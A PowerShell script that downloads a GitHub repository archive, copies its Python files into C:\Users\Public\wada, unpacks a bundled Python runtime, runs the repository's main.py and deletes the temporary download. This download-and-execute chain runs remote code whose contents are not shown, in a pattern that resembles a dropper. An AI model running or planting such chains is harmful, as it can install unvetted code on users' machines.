# Define the target directory
$targetDir = "C:\Users\Public\wada"

# Create the target directory if it doesn't exist
if (-Not (Test-Path -Path $targetDir)) {
    New-Item -ItemType Directory -Path $targetDir
}

# Define the URL of the GitHub repository
$repoUrl = "https://github.com/Zippy-boy/tests/archive/refs/heads/main.zip"

# Define the path to download the zip file
$zipFilePath = "$env:TEMP\repo.zip"

# Download the zip file
Invoke-WebRequest -Uri $repoUrl -OutFile $zipFilePath

# Define the path to extract the zip file
$extractPath = "$env:TEMP\repo"

# Extract the zip file
Expand-Archive -Path $zipFilePath -DestinationPath $extractPath -Force

# Copy the contents to the target directory
Copy-Item -Path "$extractPath\tests-main\python\*" -Destination $targetDir -Recurse -Force

# Clean up
Remove-Item -Path $zipFilePath -Force
Remove-Item -Path $extractPath -Recurse -Force

Write-Output "Files copied successfully to $targetDir"

# Define the path to the .conda.tar.gz file
$condaTarGzPath = "$targetDir\.conda.tar.gz"

# Define the path to extract the .conda.tar.gz file
$condaExtractPath = "$targetDir\.conda"

# Create the extraction directory if it doesn't exist
if (-Not (Test-Path -Path $condaExtractPath)) {
    New-Item -ItemType Directory -Path $condaExtractPath
}

# Extract the .conda.tar.gz file
& tar -xzf $condaTarGzPath -C $condaExtractPath

Write-Output ".conda.tar.gz extracted successfully to $condaExtractPath"

# Define the path to the Python executable
$pythonExePath = "$condaExtractPath\python.exe"

# Define the path to the main.py script
$mainPyPath = "$targetDir\main.py"

# Run the main.py script using the extracted Python executable
& $pythonExePath $mainPyPath

Write-Output "main.py executed successfully"